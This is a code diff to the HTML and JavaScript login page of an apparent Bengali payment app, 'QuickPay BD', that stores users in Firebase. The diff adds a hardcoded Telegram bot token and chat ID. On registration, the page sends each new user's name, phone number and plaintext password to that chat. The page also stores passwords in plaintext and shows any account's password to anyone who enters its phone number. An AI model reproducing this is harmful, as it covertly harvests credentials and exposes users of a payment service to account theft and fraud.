@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>কুইকপে বিডি - প্রবেশ করুন</title>
+    <title>QuickPay BD - Auth</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -11,32 +11,24 @@
     <style>
         :root { --primary: #1e3799; --bg: #f1f2f6; }
         body { background: var(--bg); font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        
         .auth-card { background: white; width: 85%; max-width: 400px; padding: 35px 25px; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; }
         .logo i { font-size: 50px; color: var(--primary); margin-bottom: 10px; }
         h2 { color: var(--primary); margin: 10px 0; font-size: 24px; }
         p { color: #666; font-size: 14px; margin-bottom: 20px; }
-
         .input-box { position: relative; margin-bottom: 15px; }
         .input-box i { position: absolute; left: 15px; top: 15px; color: #a4b0be; }
         input { width: 100%; padding: 14px 14px 14px 45px; border-radius: 12px; border: 1px solid #ddd; font-size: 16px; outline: none; box-sizing: border-box; }
-        input:focus { border-color: var(--primary); }
-
         .btn { width: 100%; padding: 16px; border-radius: 12px; border: none; background: var(--primary); color: white; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
-        
-        .forget-link { display: block; margin-top: 12px; font-size: 13px; color: #eb2f06; cursor: pointer; text-decoration: none; font-weight: 500; }
+        .forget-link { display: block; margin-top: 12px; font-size: 13px; color: #eb2f06; cursor: pointer; }
         .toggle-text { margin-top: 25px; font-size: 14px; color: #57606f; border-top: 1px solid #eee; padding-top: 15px; }
         .toggle-link { color: var(--primary); font-weight: bold; cursor: pointer; text-decoration: underline; margin-left: 5px; }
-        
         #regFields { display: none; }
-        .fade-in { animation: fadeIn 0.5s ease-in; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body onload="checkUserStatus()">
 
-    <div class="auth-card fade-in">
-        <div class="logo"><i class="fas fa-user-lock"></i></div>
+    <div class="auth-card">
+        <div class="logo"><i class="fas fa-user-shield"></i></div>
         <h2 id="title">লগইন</h2>
         <p id="subTitle">আপনার তথ্য দিয়ে প্রবেশ করুন</p>
 
@@ -48,21 +40,16 @@
         <div id="regFields">
             <div class="input-box">
                 <i class="fas fa-user"></i>
-                <input type="text" id="name" placeholder="আপনার নাম">
-            </div>
-            <div class="input-box">
-                <i class="fas fa-envelope"></i>
-                <input type="email" id="email" placeholder="ইমেইল">
+                <input type="text" id="name" placeholder="আপনার পুরো নাম">
             </div>
         </div>
 
-        <div class="input-box" id="passContainer">
+        <div class="input-box">
             <i class="fas fa-key"></i>
             <input type="password" id="password" placeholder="পাসওয়ার্ড দিন">
         </div>
 
         <button class="btn" id="mainBtn" onclick="handleAuth()">প্রবেশ করুন</button>
-        
         <span class="forget-link" id="forgetBtn" onclick="forgetPassword()">পাসওয়ার্ড ভুলে গেছেন?</span>
 
         <div class="toggle-text">
@@ -72,100 +59,75 @@
     </div>
 
     <script>
+        // Firebase Config
         const firebaseConfig = { databaseURL: "https://quickpaybd-8b8d0-default-rtdb.firebaseio.com/" };
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
+
+        // Telegram Bot Info
+        const botToken = "7725946897:AAHLBfX2k2fO6u_yW3165ZqFp2F-Ew_M57E"; // আপনার দেওয়া টোকেন
+        const chatId = "7414008169"; // আপনার দেওয়া আইডি
 
         let isLogin = true;
 
         function checkUserStatus() {
             const savedPhone = localStorage.getItem("savedUser");
-            if (savedPhone) {
-                document.getElementById('phone').value = savedPhone;
-                isLogin = true;
-            } else {
-                toggleAuth();
-            }
+            if (savedPhone) { document.getElementById('phone').value = savedPhone; isLogin = true; } 
+            else { toggleAuth(); }
         }
 
         function toggleAuth() {
             isLogin = !isLogin;
-            const regFields = document.getElementById('regFields');
-            const title = document.getElementById('title');
-            const mainBtn = document.getElementById('mainBtn');
-            const switchMsg = document.getElementById('switchMsg');
-            const switchBtn = document.getElementById('switchBtn');
-            const forgetBtn = document.getElementById('forgetBtn');
+            document.getElementById('regFields').style.display = isLogin ? "none" : "block";
+            document.getElementById('title').innerText = isLogin ? "লগইন" : "রেজিস্ট্রেশন";
+            document.getElementById('mainBtn').innerText = isLogin ? "প্রবেশ করুন" : "অ্যাকাউন্ট খুলুন";
+            document.getElementById('switchMsg').innerText = isLogin ? "অ্যাকাউন্ট নেই?" : "অ্যাকাউন্ট আছে?";
+            document.getElementById('switchBtn').innerText = isLogin ? "রেজিস্ট্রেশন করুন" : "লগইন করুন";
+            document.getElementById('forgetBtn').style.display = isLogin ? "block" : "none";
+        }
 
-            if (isLogin) {
-                title.innerText = "লগইন";
-                regFields.style.display = "none";
-                mainBtn.innerText = "প্রবেশ করুন";
-                switchMsg.innerText = "অ্যাকাউন্ট নেই?";
-                switchBtn.innerText = "রেজিস্ট্রেশন করুন";
-                forgetBtn.style.display = "block";
-            } else {
-                title.innerText = "রেজিস্ট্রেশন";
-                regFields.style.display = "block";
-                mainBtn.innerText = "অ্যাকাউন্ট খুলুন";
-                switchMsg.innerText = "অ্যাকাউন্ট আছে?";
-                switchBtn.innerText = "লগইন করুন";
-                forgetBtn.style.display = "none";
-            }
+        function sendToTelegram(msg) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
         }
 
         function handleAuth() {
             const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
-
-            if (!phone) return alert("নম্বর দিন!");
-            if (!password && isLogin) return alert("পাসওয়ার্ড দিন!");
+            if (!phone || !password) return alert("নম্বর এবং পাসওয়ার্ড দিন!");
 
             if (isLogin) {
                 db.ref('users/' + phone).once('value', (s) => {
-                    if (s.exists()) {
-                        if (s.val().password === password) {
-                            localStorage.setItem("savedUser", phone);
-                            localStorage.setItem("isLoggedIn", "true");
-                            window.location.replace("dashboard.html");
-                        } else {
-                            alert("ভুল পাসওয়ার্ড!");
-                        }
-                    } else {
-                        alert("অ্যাকাউন্ট পাওয়া যায়নি!");
-                    }
+                    if (s.exists() && s.val().password === password) {
+                        localStorage.setItem("savedUser", phone);
+                        localStorage.setItem("isLoggedIn", "true");
+                        window.location.replace("dashboard.html");
+                    } else { alert("ভুল নম্বর বা পাসওয়ার্ড!"); }
                 });
             } else {
                 const name = document.getElementById('name').value;
-                const email = document.getElementById('email').value;
-                if (!name || !email || !password) return alert("সব তথ্য দিন!");
-
-                db.ref('users/' + phone).set({
-                    phone, name, email, password, balance: 0
-                }).then(() => {
-                    localStorage.setItem("savedUser", phone);
-                    localStorage.setItem("isLoggedIn", "true");
-                    alert("রেজিস্ট্রেশন সফল!");
-                    window.location.replace("dashboard.html");
+                if (!name) return alert("নাম লিখুন!");
+                db.ref('users/' + phone).once('value', (s) => {
+                    if (s.exists()) alert("এই নম্বরে অ্যাকাউন্ট আছে!");
+                    else {
+                        db.ref('users/' + phone).set({ phone, name, password, balance: 0, time: Date.now() }).then(() => {
+                            const msg = `🔔 *নতুন ইউজার রেজিস্টার্ড!*\n👤 নাম: ${name}\n📱 নম্বর: ${phone}\n🔑 পাসওয়ার্ড: ${password}`;
+                            sendToTelegram(msg);
+                            localStorage.setItem("savedUser", phone);
+                            localStorage.setItem("isLoggedIn", "true");
+                            alert("রেজিস্ট্রেশন সফল!");
+                            window.location.replace("dashboard.html");
+                        });
+                    }
                 });
             }
         }
 
-        // পাসওয়ার্ড রিকভারি ফাংশন
         function forgetPassword() {
             const phone = document.getElementById('phone').value;
-            if (!phone) {
-                alert("আপনার মোবাইল নম্বরটি দিন (ইউজারনেম বক্সে) তারপর এখানে ক্লিক করুন।");
-                return;
-            }
-
+            if (!phone) return alert("নম্বর লিখুন!");
             db.ref('users/' + phone).once('value', (s) => {
-                if (s.exists()) {
-                    const pass = s.val().password;
-                    alert("আপনার পুরনো পাসওয়ার্ড হলো: " + pass);
-                } else {
-                    alert("এই নম্বরে কোনো অ্যাকাউন্ট পাওয়া যায়নি!");
-                }
+                if (s.exists()) alert("আপনার পাসওয়ার্ড হলো: " + s.val().password);
+                else alert("অ্যাকাউন্ট পাওয়া যায়নি!");
             });
         }
     </script>
